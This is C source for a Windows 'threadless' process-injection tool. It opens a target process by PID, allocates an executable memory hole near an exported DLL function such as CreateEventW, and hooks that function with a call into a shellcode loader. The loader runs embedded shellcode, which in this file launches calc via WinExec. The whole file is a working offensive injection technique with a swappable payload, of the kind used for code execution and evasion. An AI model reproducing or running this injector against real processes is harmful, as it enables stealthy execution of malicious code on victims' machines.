#include <stdio.h>
#include <windows.h>
#include <stdint.h>

void GenerateHook(int64_t originalInstruction);
int64_t FindMemoryHole(IN HANDLE hProcess, IN void** exportedFunctionAddress, IN int size);


void ConcatArrays(unsigned char* result, const unsigned char* arr1, size_t arr1Size, const unsigned char* arr2, size_t arr2Size) {
	// Copy elements from the first array
	for (size_t i = 0; i < arr1Size; ++i) {
		result[i] = arr1[i];
	}

	// Copy elements from the second array
	for (size_t i = 0; i < arr2Size; ++i) {
		result[arr1Size + i] = arr2[i];
	}
}

/* just a shellcode in string format
unsigned char shellcode_loader[] =
"\x58\x48\x83\xe8\x05\x50\x51\x52\x41\x50\x41\x51\x41\x52\x41\x53\x48\xb9"
"\x88\x77\x66\x55\x44\x33\x22\x11\x48\x89\x08\x48\x83\xec\x40\xe8\x11\x00"
"\x00\x00\x48\x83\xc4\x40\x41\x5B\x41\x5A\x41\x59\x41\x58\x5A\x59\x58\xff"
"\xe0\x90";
*/


unsigned char shellcode_loader[] = {
		0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
		0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 0xE8, 0x11, 0x00,
		0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF,
		0xE0, 0x90
};



unsigned char shellcode[] = {
0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

int main(int argc, char** argv)
{
	//PARSING ARGUMENTS
	if (argc != 4) {
		printf("\n");
		printf("[ERROR]: DLL, Exported Function or PID is missing!\n");
		printf("  [Demo Usage]: ThreadlessInject-C.exe kernelbase.dll CreateEventW 1000\n\n");
		return 0;
	}
	char* moduleName = argv[1];
	char* exportedFunction = argv[2];
	DWORD pid = atoi(argv[3]);
	BOOL rez = FALSE;
	int writtenBytes = 0;

	//Loading DLL into the process
	printf("\n[*] Loading: %s\n", moduleName);
	HMODULE hModule = GetModuleHandle(argv[1]);

	if (hModule == NULL)
	{
		hModule = LoadLibraryA(argv[1]);
	}

	if (hModule == NULL)
	{
		printf("[ERROR] Could not load %s\n", moduleName);
		return -99;
	}
	printf("  [+] Successfully loaded %s\n\n", moduleName);

	//Getting the address of specific function of the DLL
	printf("[*] Getting the address of %s\n", exportedFunction);
	void* exportedFunctionAddress = GetProcAddress(hModule, exportedFunction);
	if (exportedFunctionAddress == NULL)
	{
		printf("  [ERROR] Could not find %s in %s\n", exportedFunction, moduleName);
		return -99;
	}
	printf("  [+] %s Address: 0x%p\n\n", exportedFunction, exportedFunctionAddress);


	// Opening a Process
	printf("[*] Trying to open process with pid: %d\n", pid);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		printf("  [ERROR] Could not open process with pid %d\n", pid);
		return -99;
	}
	printf("  [+] Successfully opened process with pid %d\n\n", pid);

	//Allocating memory holes
	printf("[*] Trying to find memory holes\n");
	int64_t memoryHoleAddress = FindMemoryHole(hProcess, exportedFunctionAddress, sizeof(shellcode_loader) + sizeof(shellcode));
	if (memoryHoleAddress == 0)
	{
		printf("  [Error] Could not find memory hole\n");
		return -99;
	}

	// Reading content from memory address of exported function
	printf("[*] Reading bytes from the memory address of %s\n", exportedFunction);
	int64_t originalBytes = *(int64_t*)exportedFunctionAddress;
	printf("  [+] Address %p has value = %lld\n\n", exportedFunctionAddress, originalBytes);

	// Implementing the hook
	printf("[*] Generating hook");
	GenerateHook(originalBytes);

	//Chaning the memory protection settings of the exported function into the calling process to RWX
	printf("[*] Changing the memory protection of %s to RWX\n", exportedFunction);
	DWORD oldProtect = 0;
	if (!VirtualProtectEx(hProcess, exportedFunctionAddress, 8, PAGE_EXECUTE_READWRITE, &oldProtect))
	{
		printf("  [Error] Could not change the memory protection settings\n");
		return -99;
	}
	printf("  [+] Successfully changed the memory protection settings of %s to RWX\n", exportedFunction);

	// Injecting a call instruction into the exported function
	printf("[*] Trying to inject the call assembly for the exported function\n");
	int callPointerAddress = (memoryHoleAddress - ((UINT_PTR)exportedFunctionAddress + 5));
	unsigned char callFunctionShellcode[] = { 0xe8, 0, 0, 0, 0 };
	*(int*)(callFunctionShellcode + 1) = callPointerAddress;
	VirtualProtectEx(hProcess, callFunctionShellcode, sizeof(callFunctionShellcode), PAGE_EXECUTE_READWRITE, NULL);
	if (!WriteProcessMemory(hProcess, exportedFunctionAddress, callFunctionShellcode, sizeof(callFunctionShellcode), &writtenBytes))
	{
		printf("  [Error] Could redirect %s\n", exportedFunction);
		return -99;
	}
	printf("  [+] Successfully modified %s function to call the custom shellcode\n", exportedFunction);

	// Compiling final payload and injecting the hook
	unsigned char payload[sizeof(shellcode_loader) + sizeof(shellcode)];
	ConcatArrays(&payload, &shellcode_loader, sizeof(shellcode_loader), shellcode, sizeof(shellcode));

	if (!VirtualProtectEx(hProcess, memoryHoleAddress, sizeof(payload), PAGE_READWRITE, &oldProtect))
	{
		printf("[Error] Modifying the memory protection of the memory hole: %p before write\n", memoryHoleAddress);
		return -99;
	}

	if (!WriteProcessMemory(hProcess, memoryHoleAddress, payload, sizeof(payload), &writtenBytes))
	{
		printf("[Error] Writing to the memory hole address: %p\n", memoryHoleAddress);
		return -99;
	}

	if (!VirtualProtectEx(hProcess, memoryHoleAddress, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect))
	{
		printf("[Error] Modifying the memory protection of the memory hole: %p after write\n", memoryHoleAddress);
		return -99;
	}

	printf("\n[+] Injection successful, wait for your trigger function!\n");
	Sleep(2000);
}


int64_t FindMemoryHole(IN HANDLE hProcess, IN void** exportedFunctionAddress, IN int size)
{
	UINT_PTR  remoteAddress;
	BOOL foundMemory = FALSE;
	uint64_t exportAddress = exportedFunctionAddress;

	for (remoteAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000;
		remoteAddress < exportAddress + 0x70000000;
		remoteAddress += 0x10000)
	{
		LPVOID lpAddr = VirtualAllocEx(hProcess, remoteAddress, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (lpAddr == NULL)
		{
			continue;
		}
		foundMemory = TRUE;
		break;
	}

	if (foundMemory == TRUE)
	{
		printf("  [*] Found Memory Hole: %p\n", remoteAddress);
		return remoteAddress;
	}

	return 0;

}


void GenerateHook(int64_t originalInstruction)
{
	*(uint64_t*)(shellcode_loader + 0x12) = originalInstruction;
	printf("  [+] Hook successfully placed");
}